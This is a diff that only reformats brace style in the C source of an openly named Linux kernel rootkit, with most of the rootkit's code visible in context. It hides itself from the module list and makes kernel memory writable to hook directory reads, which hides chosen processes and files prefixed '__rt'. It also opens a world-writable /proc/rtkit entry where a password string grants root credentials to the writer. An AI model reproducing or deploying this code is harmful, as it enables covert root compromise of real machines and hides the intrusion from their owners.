@@ -44,7 +44,8 @@ static char module_hidden = 0;
 static char module_status[1024];
 
 //MODULE HELPERS
-void module_hide(void) {
+void module_hide(void)
+{
 	if (module_hidden) return;
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
@@ -54,7 +55,8 @@ void module_hide(void) {
 	module_hidden = !module_hidden;
 }
  
-void module_show(void) {
+void module_show(void)
+{
 	int result;
 	if (!module_hidden) return;
 	list_add(&THIS_MODULE->list, module_previous);
@@ -63,20 +65,23 @@ void module_show(void) {
 }
 
 //PAGE RW HELPERS
-static void set_addr_rw(void *addr) {
+static void set_addr_rw(void *addr)
+{
 	unsigned int level;
 	pte_t *pte = lookup_address((unsigned long) addr, &level);
 	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
 }
 
-static void set_addr_ro(void *addr) {
+static void set_addr_ro(void *addr)
+{
 	unsigned int level;
 	pte_t *pte = lookup_address((unsigned long) addr, &level);
 	pte->pte = pte->pte &~_PAGE_RW;
 }
 
 //CALLBACK SECTION
-static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type) {
+static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+{
 	int i;
 	for (i=0; i < current_pid; i++) {
 		if (!strcmp(name, pids_to_hide[i])) return 0;
@@ -85,22 +90,26 @@ static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t off
 	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
 
-static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir) {
+static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
+{
 	proc_filldir_orig = filldir;
 	return proc_readdir_orig(filp, dirent, proc_filldir_new);
 }
 
-static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type) {
+static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+{
 	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
 	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
 
-static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir) {
+static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
+{
 	fs_filldir_orig = filldir;
 	return fs_readdir_orig(filp, dirent, fs_filldir_new);
 }
 
-static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data) {
+static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
+{
 	int size;
 	
 	sprintf(module_status, 
@@ -132,7 +141,8 @@ STATUS\n\
 	return size-off;
 }
 
-static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data) {
+static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
+{
 	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
 		credentials->uid = credentials->euid = 0;
@@ -154,7 +164,8 @@ static int rtkit_write(struct file *file, const char __user *buff, unsigned long
 }
 
 //INITIALIZING/CLEANING HELPER METHODS SECTION
-static void procfs_clean(void) {
+static void procfs_clean(void)
+{
 	if (proc_rtkit != NULL) {
 		remove_proc_entry("rtkit", NULL);
 		proc_rtkit = NULL;
@@ -166,7 +177,8 @@ static void procfs_clean(void) {
 	}
 }
 	
-static void fs_clean(void) {
+static void fs_clean(void)
+{
 	if (fs_fops != NULL && fs_readdir_orig != NULL) {
 		set_addr_rw(fs_fops);
 		fs_fops->readdir = fs_readdir_orig;
@@ -174,7 +186,8 @@ static void fs_clean(void) {
 	}
 }
 
-static int __init procfs_init(void) {
+static int __init procfs_init(void)
+{
 	//new entry in proc root with 666 rights
 	proc_rtkit = create_proc_entry("rtkit", 0666, NULL);
 	if (proc_rtkit == NULL) return 0;
@@ -195,7 +208,8 @@ static int __init procfs_init(void) {
 	return 1;
 }
 
-static int __init fs_init(void) {
+static int __init fs_init(void)
+{
 	struct file *etc_filp;
 	
 	//get file_operations of /etc
@@ -215,7 +229,8 @@ static int __init fs_init(void) {
 
 
 //MODULE INIT/EXIT
-static int __init rootkit_init(void) {
+static int __init rootkit_init(void)
+{
 	if (!procfs_init() || !fs_init()) {
 		procfs_clean();
 		fs_clean();
@@ -226,7 +241,8 @@ static int __init rootkit_init(void) {
 	return 0;
 }
 
-static void __exit rootkit_exit(void) {
+static void __exit rootkit_exit(void)
+{
 	procfs_clean();
 	fs_clean();
 }
